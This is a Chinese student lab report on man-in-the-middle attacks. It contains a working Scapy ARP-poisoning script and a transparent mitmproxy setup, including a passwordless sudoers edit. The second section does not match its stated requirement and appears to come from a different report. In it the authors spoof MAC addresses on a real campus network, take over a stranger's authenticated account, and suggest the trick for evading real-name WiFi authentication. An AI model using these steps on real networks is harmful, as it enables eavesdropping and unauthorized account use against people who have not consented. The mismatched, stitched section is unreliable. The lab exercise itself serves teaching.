# 网络安全工程 实验2：中间人攻击

## 实验要求

在攻击机上利用Scapy伪造数据包，对另外两台靶机进行ARP欺骗，实现窃听靶机之间的会话，在实现ARP欺骗的基础上，进一步实现中间人攻击。利用iptables 修改流量的转发端口，使用mitmproxy进行拦截请求，可以获取到请求的参数，从中提取出重要的信息，比如用户名和密码，也能够修改响应，改变返回的内容。mitmproxy 提供了inline script 方法，能够使用脚本来操作流量，使得mitmproxy 的功能更加强大，当然也可以尝试拦截https的流量，mitmproxy 也具有这样的能力。

- 要求1：使用Scapy实现窃听另外两台靶机的会话。例如窃听并提取另外两台靶机之间FTP或者HTTP会话的登录账号。
- 要求2：对另外两台靶机进行中间人攻击，实现对会话进行篡改。例如对靶机间的HTTP会话进行注入，修改HTTP响应。

## 实验环境

- 网络环境：利用路由器的自组无线局域网，子网网段192.168.1.0/24
- 攻击者 Attacker：
    - OS: MacOS 10.14
- 服务器 Server：
    - OS: MacOS
    - IP: 192.168.1.107
- 客户机 Victim：
    - OS: Windows 10
    - IP: 192.168.1.104
- **注意**：由于使用物理机环境而非kali虚拟机，因此部分操作与实验指示书有所不同

## 要求1

### 实验步骤

1. 首先将三台主机连入子网，为server配置http服务，随后用客户机victim通过浏览器访问服务器ip地址，可以得到 http response 如下：

    ![HTTP RESPONSE](fig/browser_norm.PNG)

2. 在攻击者上编写arp poison脚本，原理是利用Scapy分别向server和victim不断发送被修改过的ARP包，从而在二者的ARP缓存中投毒，将两者对于对方的ARP缓存均更改为attacker的MAC地址。脚本详见`src/arp_poison.py`，主要内容如下：

    ```py
        server_ip = "192.168.1.107"
        victim_ip = "192.168.1.104"
        
        # 获取目标ip的MAC地址
        def get_mac(ip_address):
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
            for s, r in ans:
                return r[Ether].src
            return None

        # 分别获取二者的MAC
        victim_mac = get_mac(victim_ip)
        server_mac = get_mac(server_ip)

        # 构造ARP包
        # 发给server的包中，源ip为victim，但源mac为attacker
        # 发给victim的包类似
        poison_server = ARP()
        poison_server.op = 2
        poison_server.psrc = victim_ip
        poison_server.pdst = server_ip
        poison_server.hwdst = server_mac

        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = server_ip
        poison_victim.pdst = victim_ip
        poison_victim.hwdst = victim_mac

        # 循环发送，保证占有ARP缓存
        while True:
            send(poison_server)
            send(poison_victim)
            time.sleep(2)
            print("Poisoning...")
    ```
3. 执行上面的脚本，开始ARP投毒

    ```bash
        $ python arp_poison.py
    ```

4. 为了使用mitmproxy，attacker需要开启转发，流程参考 [mitmproxy docs](https://docs.mitmproxy.org/stable/howto-transparent/#macos)，具体操作如下：

    ```bash
        $ sudo sysctl -w net.inet.ip.forwarding=1
        $ echo "rdr on en0 inet proto tcp to any port {80, 443} -> 127.0.0.1 port 8080" > pf.conf
        $ sudo pfctl -f pf.conf
        $ sudo pfctl -e
    ```
    随后修改`/etc/sudoers`，在文件末尾添加如下内容：
    ```
        ALL ALL=NOPASSWD: /sbin/pfctl -s state
    ```

5. 开启`mitmproxy`进行流量监听：
    ```bash
        $ mitmproxy --mode transparent
    ```

5. 此后，victim再向server发送请求时，attacker都会监听到HTTP会话，如，victim再次通过浏览器访问server时，attacker可以监控到相应的GET和Response：
    ![transparent](fig/transparent.PNG)

## 要求2

### 实验步骤

1. B 修改 MAC 地址冒充 A 骗过校园网认证。

   B 首先观察自己的 IP 和 MAC 地址：

   ```bash
   ifconfig
   ```

   ![B_IP](./fig/B_IP.png)

   可看到其 IP 为 183.173.36.172，MAC 为 78:4f:43:5d:85:44。

   使用如下指令将 MAC 地址改为 A 的 MAC 地址：

   ```bash
   sudo ifconfig en0 ether c4:9d:ed:03:dd:40
   ```

   此时使用 `ifconfig` 观察，MAC 地址易发生改变，但 IP 地址尚未变化。

   ![change_IP](./fig/change_IP.png)

   但很快 B 的网络状态从“已连接”变成了“正在连接”，表示其在等待分配新的 IP 地址。待网络状态变回“已连接”，再次使用 `ifconfig` 观察，发现路由器已经根据 B 此时的 MAC 地址（A 的 MAC 地址），将 A 的 IP 地址给了 B。

   ![B_after](./fig/B_after.png)

   此时 B 打开浏览器上网，进入 net.tsinghua.edu.cn，发现无线网连接确实已被 A 同学认证，并且可以访问互联网。但同时也观察到，当 A、B 同时上网时，网络会变得非常卡顿，有时也会出现无法上网，需要多次刷新的情况。

2. 攻击者（B）获取子网中其他用户的 MAC 地址。

   使用 nmap 工具对子网进行扫描：（子网掩码为 255.255.224.0，共 19 位）

   ```bash
   nmap -sP 183.173.32.0/19
   ```

   ![nmap](./fig/nmap.png)

   ![nmap_res](./fig/nmap_res.png)

   发现使用此方法并不能有效获取子网内其他用户的 IP 以及 MAC 地址。

   因此使用如下指令，查看系统对 ARP 的缓存：

   ```bash
   arp -a
   ```

   ![arp](./fig/arp.png)

   可看到输出了所有在 nmap 时缓存的 IP 地址及其对应的 MAC 地址，而 B 的 IP（183.173.38.125）和 MAC（c4:9d:ed:03:dd:40）也在其中。

   但此方法的缺陷在于，上表中的 IP 并不都是终端设备。若是 B 将 MAC 改为了非终端设备的 MAC 地址，会产生虽分配到相应 IP 地址，却无法正常上网，甚至频繁掉线的现象。在尝试 2 次不同的 IP 对应的 MAC 地址后，我们发现上图中高亮选中的 MAC 地址属于一个终端设备。通过如下命令修改 B 的 MAC：

   ```bash
   sudo ifconfig en0 ether 9c:e3:3f:ba:a5:5f
   ```

   一段时间后使用 `ifconfig` 观察：

   ![anonymous](./fig/anonymous.png)

   发现成功修改了 MAC 地址，并且被自动分配到了该 MAC 地址对应的 IP 183.173.39.169。

   在浏览器中输入 net.tsinghua.edu.cn，结果如下：

   ![succeed](./fig/succeed.png)

   说明 B 确实使用这种方法成功盗用了陌生人的校园网账号，校园网验证方式存在漏洞。

3. 如果 B 修改 MAC 地址和 IP 地址冒充 A，可以做什么？

   在一些公共场合下，很多 WIFI 是无密码，开放连接，但是连接后需要通过短信或微信实名认证。在这种情况下，B 可以利用这种方式随机选取 A 并冒充，达到免认证上网，从而达到 B 的访问网络的真实身份（如 B 的 MAC 地址）被隐匿。

## 分工情况

两实验均由两人共同完成。其中，李逸飞完成了第一题的实验报告，乔逸凡完成了第二题的实验报告。
